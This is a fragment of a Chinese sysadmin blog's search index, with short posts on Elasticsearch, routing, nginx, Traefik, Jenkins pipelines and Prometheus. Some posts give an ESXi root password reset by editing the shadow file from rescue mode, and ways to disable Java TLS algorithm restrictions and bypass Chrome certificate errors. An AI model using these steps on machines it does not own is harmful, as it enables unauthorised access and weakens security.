10:47","objectID":"/post/2423/:0:6","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"7.配置连接es的各个账户密码 bin/elasticsearch-setup-passwords interactive ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:7","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"8.简单启动脚本 vim /etc/init.d/es #!/bin/bash #chkconfig: 35 90 90 ES_BIN=/usr/local/elasticsearch-7.8.1/bin/ function pid_is_exist(){ ps -ef | grep [e]lasticsearch | grep -v x-pack-ml \u003e /dev/null 2\u003e\u00261 return $? } function start(){ w=`whoami` [[ $w == \"elasticsearch\" ]] \u0026\u0026 $ES_BIN/elasticsearch -d || su - elasticsearch -c \"$ES_BIN/elasticsearch -d\" } function stop(){ pid_is_exist if [[ $? != 0 ]] then echo \"服务未启动\" exit fi ps -ef | grep [e]lasticsearch | grep -v x-pack-ml | awk '{print $2}' | xargs kill pid_is_exist [[ $? == 0 ]] \u0026\u0026 echo 停止成功 || read -p 停止失败是否,强制停止: isforce [[ $isforce == \"y\" ]] \u0026\u0026 ps -ef | grep [e]lasticsearch | grep -v x-pack-ml | awk '{print $2}' | xargs kill -9 } case $1 in start) start ;; stop) stop ;; restart) stop start ;; *) echo Usage: $0 \"start|stop|restart\" ;; esac 添加服务开机启动 chkconfig --add es ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:8","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"9.启动服务 service es start ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:9","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控","系统服务","ELK日志收集"],"content":"10.安装其他节点 修改第四步中的配置信息 第六步不需要重新生成，把之前生成的证书拷贝到新节点即可 第七步无需执行 其他步骤相同 ","date":"2021-03-10 10:47","objectID":"/post/2423/:0:10","tags":["elasticsearch"],"title":"elasticsearch7.8.1集群安装并配置TLS+basicauth认证","uri":"/post/2423/"},{"categories":["监控"],"content":"zabbix状态： 99010-pukpeuwghok.png 手动通过snmpwalk获取： 02202-v851ipc0ux.png 服务器状态是没问题的，不知道是什么原因导致的。最后去ilo控制台看日志(Integrated Management Log)，把日志清掉就没问题了。 ","date":"2021-03-09 15:29","objectID":"/post/2233/:0:0","tags":["zabbix"],"title":"zabbix监控HP DL360 Gen10服务器,告警System status is in critical state","uri":"/post/2233/"},{"categories":["其他"],"content":"原文：http://www.huilog.com/?p=660 mac osx虽然是类unix的系统，默认也是bash shell，但是修改mac地址及管理路由表跟linux还是不一样。 ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:0","tags":["mac","unix"],"title":"mac osx修改mac地址和管理路由表的方法","uri":"/post/2232/"},{"categories":["其他"],"content":"修改mac地址,重启后失效 sudo ifconfig en0 lladdr d0:67:e5:2e:07:f1 ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:1","tags":["mac","unix"],"title":"mac osx修改mac地址和管理路由表的方法","uri":"/post/2232/"},{"categories":["其他"],"content":"查看路由表 netstat -nr ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:2","tags":["mac","unix"],"title":"mac osx修改mac地址和管理路由表的方法","uri":"/post/2232/"},{"categories":["其他"],"content":"修改路由表 sudo route delete 0.0.0.0 删除默认路由 sudo route add -net 0.0.0.0 192.168.1.1 默认使用192.168.1.1网关 sudo route add 10.0.1.0/24 10.200.22.254 其它网段指定网关 ","date":"2021-03-05 17:45","objectID":"/post/2232/:0:3","tags":["mac","unix"],"title":"mac osx修改mac地址和管理路由表的方法","uri":"/post/2232/"},{"categories":["基础内容"],"content":" set from=xxx@qq.com set smtp=smtp.qq.com set smtp-auth-user=xxx@qq.com set smtp-auth-password=xxx set smtp-auth=login echo \"邮件内容\" | mailx -s \"邮件标题\" xxx@qq.com ","date":"2021-03-03 11:04","objectID":"/post/2800/:0:0","tags":["mail"],"title":"mailx命令行发送邮件","uri":"/post/2800/"},{"categories":["系统服务"],"content":"1. proxy_connect_timeout 定义nginx与后端服务建立连接的超时时间。此超时通常不能超过75秒。默认60秒 ","date":"2021-03-03 10:07","objectID":"/post/2231/:0:1","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["系统服务"],"content":"2. proxy_read_timeout 后端服务给nginx响应的时间，规定时间内后端服务没有给nginx响应，连接会被关闭，nginx返回504 Gateway Time-out。默认60秒 ","date":"2021-03-03 10:07","objectID":"/post/2231/:0:2","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["系统服务"],"content":"3. proxy_send_timeout 定义nginx向后端服务发送请求的间隔时间(不是耗时)。默认60秒，超过这个时间会关闭连接 ","date":"2021-03-03 10:07","objectID":"/post/2231/:0:3","tags":["nginx"],"title":"nginx timeout","uri":"/post/2231/"},{"categories":["虚拟化"],"content":"1.进入虚拟机的虚拟机选项-高级-配置参数-编辑配置 72894-lygm5bqpfu.png ","date":"2021-02-20 10:32","objectID":"/post/2223/:0:1","tags":["esxi","vsphere"],"title":"vSphere 6.5(VMware Remote Console)ESXI开启远程复制粘贴","uri":"/post/2223/"},{"categories":["虚拟化"],"content":"2.添加如下两个参数(关机状态下) isolation.tools.copy.disable FALSE isolation.tools.paste.disable FALSE ","date":"2021-02-20 10:32","objectID":"/post/2223/:0:2","tags":["esxi","vsphere"],"title":"vSphere 6.5(VMware Remote Console)ESXI开启远程复制粘贴","uri":"/post/2223/"},{"categories":["其他"],"content":"方法1(可能无效). 进入win控制面板，进入java控制面板，勾选协议 46997-80cf5ll9qyh.png ","date":"2021-02-20 10:23","objectID":"/post/2218/:1:0","tags":["dell"],"title":"idrac连接报错-查看器已终止 原因：网络连接终端","uri":"/post/2218/"},{"categories":["其他"],"content":"方法2.修改java.security 文件路径：C:\\Program Files\\Java\\jre1.8.0_271\\lib\\security\\java.security 注释jdk.tls.disabledAlgorithms 08705-cyfop0plttr.png 以上为临时解决方案，最好还是升级idrac,一般可以解决 ","date":"2021-02-20 10:23","objectID":"/post/2218/:2:0","tags":["dell"],"title":"idrac连接报错-查看器已终止 原因：网络连接终端","uri":"/post/2218/"},{"categories":["基础内容"],"content":" yum install http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm rpm --import http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro yum install -y ffmpeg-2.8.15-2.el7.nux ffmpeg -version ","date":"2021-02-10 17:38","objectID":"/post/2565/:0:0","tags":["ffmpeg"],"title":"yum安装ffmpeg","uri":"/post/2565/"},{"categories":["虚拟化"],"content":"1.用centos6光盘启动，进入救援(恢复)模式。 2.进入shell模式 3.挂载分区 mkdir /mnt/sda5 mount /dev/sda5 /mnt/sda5 4.将含有shadow文件的压缩文件copy出来 cp /mnt/sda5/state.tgz /tmp/ 5.解压state.tgz,得到local.tgz,再次解压 tar xf state.tgz tar xf local.tgz 6.解压完成后得到一个etc目录,shadow文件在etc目录中.将root密码部分删掉 vi etc/shadow 7.还原压缩包 # 删除原包 rm -rf state.tgz local.tgz # 将etc压缩为local.tgz tar zcf local.tgz etc # 将local.tgz压缩为state.tgz tar zcf state.tgz local.tgz # 将state.tgz放回原位置 cp state.tgz /mnt/test 8.reboot重启 ","date":"2021-02-05 11:25","objectID":"/post/2213/:0:0","tags":["esxi"],"title":"vmware esxi密码破解重置","uri":"/post/2213/"},{"categories":["其他"],"content":"在不能访问的页面中输入thisisunsafe,然后浏览器就会跳转进入了 ","date":"2021-02-03 14:24","objectID":"/post/2211/:0:0","tags":[],"title":"chrome浏览器忽略证书错误","uri":"/post/2211/"},{"categories":["docker"],"content":" FROM debian:stable ENV TZ=Asia/Shanghai COPY fonts/ /usr/share/fonts COPY sources.list /etc/apt/ RUN apt update \u0026\u0026 apt install -y libreoffice python3-pip; exit 0 \u0026\u0026 apt autoclean \u0026\u0026 rm -fr /var/cache/* sources.list deb http://mirrors.163.com/debian/ buster main contrib non-free # deb-src http://mirrors.163.com/debian/ buster main contrib non-free deb http://mirrors.163.com/debian/ buster-updates main contrib non-free # deb-src http://mirrors.163.com/debian/ buster-updates main contrib non-free deb http://mirrors.163.com/debian/ buster-backports main contrib non-free # deb-src http://mirrors.163.com/debian/ buster-backports main contrib non-free deb http://mirrors.163.com/debian-security buster/updates main contrib non-free # deb-src http://mirrors.163.com/debian-security buster/updates main contrib non-free ","date":"2021-02-02 10:03","objectID":"/post/2210/:0:0","tags":["docker"],"title":"debian-libreoffice镜像","uri":"/post/2210/"},{"categories":["虚拟化"],"content":"https://vcsa.xxx.xxx/ui/?locale=zh_CN 中文：/?locale=zh_CN 英语：/?locale=en_US ","date":"2021-02-02 08:59","objectID":"/post/2567/:0:0","tags":[],"title":"vsphere web client 修改为中文","uri":"/post/2567/"},{"categories":["基础内容"],"content":"原文链接：https://www.jianshu.com/p/b52d1e41a461 ","date":"2021-01-21 15:02","objectID":"/post/2204/:0:0","tags":["linux"],"title":"linux下静态路由修改命令","uri":"/post/2204/"},{"categories":["基础内容"],"content":"方法一(route)： 添加路由 route add -net 192.168.0.0/24 gw 192.168.0.1 route add -host 192.168.1.1 dev eth0 删除路由 route del -net 192.168.0.0/24 gw 192.168.0.1 add 增加路由 del 删除路由 -net 设置到某个网段的路由 gw 出口网关IP地址 -host 设置到某台主机的路由 dev 出口网关物理设备名 增加默认路由：route add default gw 192.168.0.1 route -n 查看路由表 ","date":"2021-01-21 15:02","objectID":"/post/2204/:1:0","tags":["linux"],"title":"linux下静态路由修改命令","uri":"/post/2204/"},{"categories":["基础内容"],"content":"方法二(ip route)： 添加路由 ip route add 192.168.0.0/24 via 192.168.0.1 ip route add 192.168.1.1 dev eth0 删除路由 ip route del 192.168.0.0/24 via 192.168.0.1 add 增加路由 del 删除路由 via 网关出口 IP地址 dev 网关出口物理设备名 增加默认路由:ip route add default via 192.168.0.1 dev eth0 ip route查看路由信息 ","date":"2021-01-21 15:02","objectID":"/post/2204/:2:0","tags":["linux"],"title":"linux下静态路由修改命令","uri":"/post/2204/"},{"categories":["基础内容"],"content":"在linux下设置永久路由： 方法1：在/etc/rc.local里添加 route add -net 192.168.0.0/24 dev eth0 route add -net 192.168.1.0/24 gw 192.168.2.254 方法2：/etc/sysconfig/static-routes : (没有static-routes的话就手动建立一个这样的文件) any net 192.168.0.0/24 gw 192.168.3.254 any net 10.250.228.128 netmask 255.255.255.192 gw 10.250.228.129 ","date":"2021-01-21 15:02","objectID":"/post/2204/:3:0","tags":["linux"],"title":"linux下静态路由修改命令","uri":"/post/2204/"},{"categories":["基础内容"],"content":"开启 IP 转发： # echo \"1\" \u003e/proc/sys/net/ipv4/ip_forward (临时) # vi /etc/sysctl.conf --\u003e net.ipv4.ip_forward=1 (永久开启) ","date":"2021-01-21 15:02","objectID":"/post/2204/:4:0","tags":["linux"],"title":"linux下静态路由修改命令","uri":"/post/2204/"},{"categories":["系统服务","kubernetes"],"content":"一、准备工作 这里使用的alidns，创建AccessKey 29603-16eeja057wk.png 创建secret kubectl create secret generic traefik-alidns-secret --from-literal=ALICLOUD_ACCESS_KEY=\u003cAK\u003e --from-literal=ALICLOUD_SECRET_KEY=\u003cSK\u003e --from-literal=ALICLOUD_REGION_ID=cn-shanghai -n traefik-v2 ","date":"2021-01-14 10:47","objectID":"/post/2198/:1:0","tags":["k8s","traefik"],"title":"Traefik配置Let's Encrypt自动生成证书[alidns](三)","uri":"/post/2198/"},{"categories":["系统服务","kubernetes"],"content":"二、修改traefik配置(conf.yaml) # 我这里使用的是固定节点 nodeSelector: kubernetes.io/hostname: test-k8s-node1 # 持久化acme.json deployment: additionalVolumes: - name: acme hostPath: path: /etc/acme/ additionalVolumeMounts: - name: acme mountPath: /etc/acme/ additionalArguments: # 这个是用于测试的时候使用的地址，当测试证书没问题以后，需要注释下面这个配置。 # 如果证书由CN=Fake LE Intermediate X1颁发，表示符合预期。可以用过curl -s -vv1看到。 # - \"--certificatesResolvers.ali.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory\" # 指定dns的provider,其他provider: https://doc.traefik.io/traefik/https/acme/#providers - \"--certificatesResolvers.ali.acme.dnsChallenge.provider=alidns\" # 用于注册的电子邮件地址 - \"--certificatesResolvers.ali.acme.email=742899387@qq.com\" # 设置ACME证书的保存位置 - \"--certificatesResolvers.ali.acme.storage=/etc/acme/acme.json\" # 使用步骤一创建的secret envFrom: - secretRef: name: traefik-alidns-secret securityContext: capabilities: drop: [] readOnlyRootFilesystem: false runAsGroup: 0 runAsNonRoot: false runAsUser: 0 更新traefik helm upgrade -n traefik-v2 traefik ./traefik -f conf.yaml ","date":"2021-01-14 10:47","objectID":"/post/2198/:2:0","tags":["k8s","traefik"],"title":"Traefik配置Let's Encrypt自动生成证书[alidns](三)","uri":"/post/2198/"},{"categories":["系统服务","kubernetes"],"content":"三、测试 nginx应用 apiVersion: apps/v1 kind: Deployment metadata: name: nginx-test namespace: kube-ops spec: selector: matchLabels: app: nginx test: \"true\" template: metadata: labels: app: nginx test: \"true\" spec: containers: - name: nginx-test ports: - name: http containerPort: 80 image: nginx:1.17.10 --- apiVersion: v1 kind: Service metadata: name: nginx-test namespace: kube-ops spec: selector: app: nginx test: \"true\" type: ClusterIP ports: - name: web port: 80 targetPort: http ingressroute配置 --- apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: nginx-test namespace: kube-ops spec: entryPoints: - websecure routes: - match: Host(`test.soulchild.site`) kind: Rule services: - name: nginx-test port: 80 tls: certResolver: ali domains: - main: \"*.soulchild.site\" 由于域名没有备案，不能访问，我这里直接解析到traefik pod ip，访问测试 96068-0h8126hyenof.png ","date":"2021-01-14 10:47","objectID":"/post/2198/:3:0","tags":["k8s","traefik"],"title":"Traefik配置Let's Encrypt自动生成证书[alidns](三)","uri":"/post/2198/"},{"categories":["devops"],"content":"mvn String jobName = \"${env.JOB_BASE_NAME}\".toLowerCase() String imageName = \"swr.cn-east-2.myhuaweicloud.com/all-${deployEnv}/${jobName}:${BUILD_ID}\" String gitAddr = \"http://gitlab.xxx.com/xxx/server.git\" pipeline{ agent any parameters { text(defaultValue: '0m', description: 'request_cpu', name: 'request_cpu') text(defaultValue: '1Gi', description: 'request_memory', name: 'request_memory') text(defaultValue: '1000m', description: 'limit_cpu', name: 'limit_cpu') text(defaultValue: '2Gi', description: 'limit_memory', name: 'limit_memory') // choice(choices: ['blade-xxx'], description: '服务名称', name: 'serverName') // choice(choices: ['devops'], description: '命名空间', name: 'nameSpace') // choice(choices: ['dev'], description: '部署环境[dev,test,prod]', name: 'deployEnv') // choice(choices: ['dev'], description: '部署分支', name: 'branchName') choice(choices: ['1','2'], description: '副本数量', name: 'replicas') } options { timestamps() //显示日志时间 skipDefaultCheckout() //删除隐式checkout scm语句 disableConcurrentBuilds() //禁止并行 timeout(time: 20, unit: 'MINUTES') //流水线超时时间10分钟 } stages{ stage(\"拉取代码\"){ steps{ script{ wrap([$class: 'BuildUser']) { currentBuild.description = \"Started by user:${env.BUILD_USER},branch:${branchName}\" } checkout([$class: 'GitSCM', branches: [[name: \"${branchName}\"]], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[url: \"${gitAddr}\"]]]) } } } stage(\"编译\"){ steps{ script{ mvnHome = tool \"M3\" sh \"${mvnHome}/bin/mvn clean package -U -pl `find ./ -name ${serverName}` -am -Dmaven.test.skip=true\" } } } stage(\"制作镜像\"){ steps{ script{ sh \"cd `find ./ -name ${serverName}` \u0026\u0026 docker build -t ${imageName} .\" } } } stage(\"上传镜像\"){ steps{ script{ sh \"docker push ${imageName}\" } } post{ always{ script{ sh \"docker rmi ${imageName}\" } } } } stage(\"生成yaml\"){ steps{ script{ //修改命名空间 sh \"sed -i s#{nameSpace}#${nameSpace}# devops/${serverName}.yaml\" //修改镜像地址 sh \"sed -i s#{imageName}#${imageName}# devops/${serverName}.yaml\" //部署环境 sh \"sed -i s#{deployEnv}#${deployEnv}# devops/${serverName}.yaml\" //设置副本数量 sh \"sed -i s#{replicas}#${replicas}# devops/${serverName}.yaml\" //资源限制 sh \"sed -i s#{request_cpu}#${request_cpu}# devops/${serverName}.yaml\" sh \"sed -i s#{request_memory}#${request_memory}# devops/${serverName}.yaml\" sh \"sed -i s#{limit_cpu}#${limit_cpu}# devops/${serverName}.yaml\" sh \"sed -i s#{limit_memory}#${limit_memory}# devops/${serverName}.yaml\" //修改gateway的域名 if ( \"${serverName}\" == \"gateway\") { sh \"sed -i s#{domainName}#${domainName}# devops/${serverName}.yaml\" } } } } stage(\"部署\"){ steps{ script{ sh \"cat devops/${serverName}.yaml\" switch(\"${deployEnv}\") { case \"dev\": kubeConfig = \"/root/.kube/test.config\" break ;; case \"test\": kubeConfig = \"/root/.kube/test.config\" break ;; case \"prod\": kubeConfig = \"/root/.kube/prod.config\" break ;; break println(\"未知环境\") ;; } sh \"kubectl apply -f devops/${serverName}.yaml --record --kubeconfig=${kubeConfig}\" } } } stage(\"就绪检测\"){ steps{ timeout(time: 10, unit: 'MINUTES'){ //步骤超时时间 script{ sh \"kubectl rollout status -n ${nameSpace} deployment ${serverName} --kubeconfig=${kubeConfig}\" } } } } } } node String jobName = \"${env.JOB_BASE_NAME}\".toLowerCase() String imageName = \"swr.cn-east-2.myhuaweicloud.com/all-${deployEnv}/${jobName}:${BUILD_ID}\" String gitAddr = \"http://gitlab.xxx.com/xxx/frontend.git\" pipeline{ agent any /*parameters { choice(choices: ['blade-xxx'], description: '服务名称', name: 'serverName') choice(choices: ['devops'], description: '命名空间', name: 'nameSpace') choice(choices: ['dev'], description: '部署环境[dev,test,prod]', name: 'deployEnv') choice(choices: ['dev'], description: '部署分支', name: 'branchName') choice(choices: ['1'], description: '副本数量', name: 'replicas') }*/ options { timestamps() //显示日志时间 skipDefaultCheckout() //删除隐式checkout scm语句 disableConcurrentBuilds() //禁止并行 timeout(time: 20, unit: 'MINUTES') //流水线超时时间10分钟 } stages{ stage(\"拉取代码\"){ steps{ script{ wrap([$class: 'BuildUser']) { currentBuild.description = \"Started by user:${env.BUILD_US","date":"2021-01-12 16:42","objectID":"/post/2195/:0:0","tags":["jenkins"],"title":"kubernetes pipeline Jenkinsfile模板","uri":"/post/2195/"},{"categories":["基础内容"],"content":"原文链接: https://blog.csdn.net/ayu_ag/article/details/51123198 在linux中，使用stat foo.txt 命令可以看到文件foo.txt的三个时间： atime：access time，访问时间 mtime：modify time，修改时间，文件内容有修改 ctime：change time，create time，改变时间，文件的索引节点发生变化，具体的情况有：1、文件内容有修改；2、文件权限有修改；3、inode变了；4、重命名(重命名不会导致inode改变) PS： 1、如果用vi去修改某个文件，可能会发现这三个时间都被更新了，因为vi使用了临时文件保存修改，在wq时替换了原来的文件，导致文件的inode被改变了，可以用ls -li验证一下 2、如果想修改mtime，可以echo “hello world” » foo.txt，注意ctime也会跟着改变 3、如果想仅仅修改ctime，可以chmod 644 foo.txt，mtime不会改变 4、为什么没说atime呢，不是想象中的那么简单的，后面详细分析 对于一个文件foo.txt ls -l foo.txt 显示的是mtime ls -l -c foo.txt 显示的是ctime ls -l -u foo.txt 显示的是atime 对于atime，当你以为cat foo.txt然后stat foo.txt能看到atime改变的话，很可能就会失望了，并不是每次atime都更新的 atime和mount的参数以及内核有关： atime Do not use noatime feature, then the inode access time is controlled by kernel defaults. See also the description for strictatime and relatime mount options. noatime Do not update inode access times on this filesystem (e.g., for faster access on the news spool to speed up news servers). relatime Update inode access times relative to modify or change time. Access time is only updated if the previous access time was earlier than the current modify or change time. (Similar to noatime, but doesn't break mutt or other applications that need to know if a file has been read since the last time it was modified.) Since Linux 2.6.30, the kernel defaults to the behavior provided by this option (unless noatime was specified), and the strictatime option is required to obtain traditional semantics. In addition, since Linux 2.6.30, the file's last access time is always updated if it is more than 1 day old. norelatime Do not use relatime feature. See also the strictatime mount option. strictatime Allows to explicitly requesting full atime updates. This makes it pos‐ sible for kernel to defaults to relatime or noatime but still allow userspace to override it. \u003cspan style=\"color:#ff0000;\"\u003eFor more details about the default system mount options see /proc/mounts\u003c/span\u003e. nostrictatime Use the kernel's default behaviour for inode access time updates. 如果使用noatime，那么atime就不会被更新，即使修改了文件内容 如果使用atime，采用内核默认行为，kernel2.6.30后就相当于使用了relatime 如果使用relatime，表示当atime比ctime或mtime更早，然后你又去读取了文件，atime才会被更新为当前时间，kernel2.6.30后的默认行为；或者atime比现在早一天，那么atime在文件读取时会被更新 如果使用strictatime，atime在文件每次被读取时，都能够被更新 cat /proc/mounts可以看到我的服务器使用的是relatime参数： /dev/sdl1 /home ext4 rw,relatime,user_xattr,barrier=1,data=ordered 0 0 实验环节： noatime，可以看到不管是修改文件还是读取文件，atime都不会变化，性能最好 $ sudo mount -t tmpfs -o noatime tmpfs /mnt $ cd /mnt /mnt$ echo \"hello world\" \u003e\u003e foo.c /mnt$ stat foo.c File: `foo.c' Size: 12 Blocks: 8 IO Block: 4096 regular file Device: 18h/24d Inode: 60855528 Links: 1 Access: (0644/-rw-r--r--) Uid: (xxxxxx) Gid: ( 100/ users) \u003cspan style=\"color:#ff0000;\"\u003eAccess: 2016-04-11 17:46:19.734162324 +0800 #最初值\u003c/span\u003e Modify: 2016-04-11 17:46:19.734162324 +0800 Change: 2016-04-11 17:46:19.734162324 +0800 Birth: - /mnt$ echo \"hello world\" \u003e\u003e foo.c /mnt$ stat foo.c File: `foo.c' Size: 24 Blocks: 8 IO Block: 4096 regular file Device: 18h/24d Inode: 60855528 Links: 1 Access: (0644/-rw-r--r--) Uid: (xxxxxx) Gid: ( 100/ users) \u003cspan style=\"color:#ff0000;\"\u003eAccess: 2016-04-11 17:46:19.734162324 +0800 #写文件后，atime不变\u003c/span\u003e Modify: 2016-04-11 17:46:38.142096924 +0800 Change: 2016-04-11 17:46:38.142096924 +0800 Birth: - /mnt$ cat foo.c hello world hello world /mnt$ stat foo.c File: `foo.c' Size: 24 Blocks: 8 IO Block: 4096 regular file Device: 18h/24d Inode: 60855528 Links: 1 Access: (0644/-rw-r--r--) Uid: (xxxxxx) Gid: ( 100/ users) \u003cspan style=\"color:#ff0000;\"\u003eAccess: 2016-04-11 17:46:19.734162324 +0800 #读文件后，atime不变\u003c/span\u003e Modify: 2016-04-11 17:46:38.142096924 +0800 Change: 2016-04-11 17:46:38.142096924 +0800 Birth: - /mnt$ cd $ sudo umount /mnt relatime，当atime早于或等于mtime/ctime时，才会被更新，2.6.30后的内核的默认行为，性能和atime折中的选择 $ sudo mount -t tmpfs -o relatime tmpfs /mnt $ cd /mnt /mnt$ echo \"hello world\" \u003e\u003e foo.c /mnt$ stat foo.c File: `foo.c' Size: 12 Blocks: 8 IO Block: 4096 regular file Device: 19h/25d Inode: 60855680 Links: 1 ","date":"2021-01-11 15:41","objectID":"/post/2184/:0:0","tags":["linux"],"title":"为什么有时候读取文件，atime不更新","uri":"/post/2184/"},{"categories":["监控"],"content":"kubernetes_sd_config通过发现k8s中各种对象的IP地址端口等信息,作为target来抓取。 可以配置以下角色类型来获取不同对象的ip和port等信息: ","date":"2021-01-04 18:30","objectID":"/post/2180/:0:0","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"一、角色类型 ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:0","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"1. node node角色可以发现集群中每个node节点的地址端口，默认为Kubelet的HTTP端口。目标地址默认为Kubernetes节点对象的第一个现有地址，地址类型顺序为NodeInternalIP、NodeExternalIP、NodeLegacyHostIP和NodeHostName。 可用标签 __meta_kubernetes_node_name: node节点的名称 __meta_kubernetes_node_label_\u003clabelname\u003e: k8s中node节点的标签.\u003clabelname\u003e代表标签名称 __meta_kubernetes_node_labelpresent_\u003clabelname\u003e: 标签存在则为true.\u003clabelname\u003e代表标签名称 __meta_kubernetes_node_annotation_\u003cannotationname\u003e: k8s中node节点的注解.\u003cannotationname\u003e代表注解名称 __meta_kubernetes_node_annotationpresent_\u003cannotationname\u003e: 注解存在则为true.\u003cannotationname\u003e代表注解名称 __meta_kubernetes_node_address_\u003caddress_type\u003e: 不同类型的node节点地址,例如: _meta_kubernetes_node_address_Hostname=\"test-k8s-node1\" _meta_kubernetes_node_address_InternalIP=\"10.0.0.11\" instance: 从apiserver获取到的节点名称 ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:1","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"2. service service角色可以发现每个service的ip和port,将其作为target。这对于黑盒监控(blackbox)很有用 可用标签 __meta_kubernetes_namespace: service所在的命名空间 __meta_kubernetes_service_annotation_\u003cannotationname\u003e: k8s中service的注解 __meta_kubernetes_service_annotationpresent_\u003cannotationname\u003e: 注解存在则为true __meta_kubernetes_service_cluster_ip: k8s中service的clusterIP __meta_kubernetes_service_external_name: k8s中service的external_name __meta_kubernetes_service_label_\u003clabelname\u003e: k8s中service的标签 __meta_kubernetes_service_labelpresent_\u003clabelname\u003e: 标签存在则为true __meta_kubernetes_service_name: k8s中service的名称 __meta_kubernetes_service_port_name: k8s中service的端口 __meta_kubernetes_service_port_protocol: k8s中service的端口协议 __meta_kubernetes_service_type: k8s中service的类型 ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:2","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"3. pod pod角色可以发现所有pod并将其中的pod ip作为target。如果有多个端口或者多个容器，将生成多个target(例如:80,443这两个端口,pod ip为10.0.244.22,则将10.0.244.22:80,10.0.244.22:443分别作为抓取的target)。 如果容器没有指定的端口，则会为每个容器创建一个无端口target，以便通过relabel手动添加端口。 __meta_kubernetes_namespace: pod所在的命名空间 __meta_kubernetes_pod_name: pod的名称 __meta_kubernetes_pod_ip: pod的ip __meta_kubernetes_pod_label_\u003clabelname\u003e: pod的标签 __meta_kubernetes_pod_labelpresent_\u003clabelname\u003e: 标签存在则为true __meta_kubernetes_pod_annotation_\u003cannotationname\u003e: pod的注解 __meta_kubernetes_pod_annotationpresent_\u003cannotationname\u003e: 注解存在则为true __meta_kubernetes_pod_container_init: 如果容器是InitContainer，则为true __meta_kubernetes_pod_container_name: 容器的名称 __meta_kubernetes_pod_container_port_name: 容器的端口名称 __meta_kubernetes_pod_container_port_number: 容器的端口号 __meta_kubernetes_pod_container_port_protocol: 容器的端口协议 __meta_kubernetes_pod_ready: pod的就绪状态，true或false。 __meta_kubernetes_pod_phase: pod的生命周期状态.Pending, Running, Succeeded, Failed or Unknown __meta_kubernetes_pod_node_name: pod所在node节点名称 __meta_kubernetes_pod_host_ip: pod所在node节点ip __meta_kubernetes_pod_uid: pod的uid __meta_kubernetes_pod_controller_kind: pod控制器的类型ReplicaSet ,DaemonSet,Job,StatefulSet… __meta_kubernetes_pod_controller_name: pod控制器的名称 ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:3","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"4. endpoints endpoints角色可以从ep列表中发现target。对于每个ep地址和端口都会发现target。如果端点由Pod支持，则该Pod的所有其他容器端口（未绑定到端点端口）也将作为目标。 可用标签 __meta_kubernetes_namespace : ep对象所在的命名空间 __meta_kubernetes_endpoints_name : ep的名称 直接从ep对象的列表中获取的所有target，下面的标签将会被附加上 __meta_kubernetes_endpoint_hostname: ep的主机名 __meta_kubernetes_endpoint_node_name: ep的node节点名 __meta_kubernetes_endpoint_ready: ep的就绪状态，true或false。 __meta_kubernetes_endpoint_port_name: ep的端口名称 __meta_kubernetes_endpoint_port_protocol: ep的端口协议 __meta_kubernetes_endpoint_address_target_kind: ep对象的目标类型，比如Pod __meta_kubernetes_endpoint_address_target_name: ep对象的目标名称，比如pod名称 如果ep是属于service的话,则会附加service角色的所有标签 对于ep的后端节点是pod，则会附加pod角色的所有标签(即上边介绍的pod角色可用标签) 比如我么手动创建一个ep，这个ep关联到一个pod，则prometheus的标签中会包含这个pod角色的所有标签 apiVersion: v1 kind: Endpoints metadata: name: ep-test subsets: - addresses: - ip: 10.244.3.18 nodeName: test-k8s-node3 targetRef: kind: Pod name: mysql-hcrr6 namespace: default ports: - name: mysql port: 3306 ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:4","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"5. ingress ingress角色发现ingress的每个路径的target。这通常对黑盒监控很有用。该地址将设置为ingress中指定的host。 可用标签 __meta_kubernetes_namespace: ingress所在的命名空间 __meta_kubernetes_ingress_name: ingress的名称 __meta_kubernetes_ingress_label_\u003clabelname\u003e: ingress的标签 __meta_kubernetes_ingress_labelpresent_\u003clabelname\u003e: 标签存在则为true __meta_kubernetes_ingress_annotation_\u003cannotationname\u003e: ingress的注解 __meta_kubernetes_ingress_annotationpresent_\u003cannotationname\u003e: 注解存在则为true __meta_kubernetes_ingress_scheme: ingress的协议，如果设置了tls则是https,默认http __meta_kubernetes_ingress_path: ingress中指定的的路径。默认为/ ","date":"2021-01-04 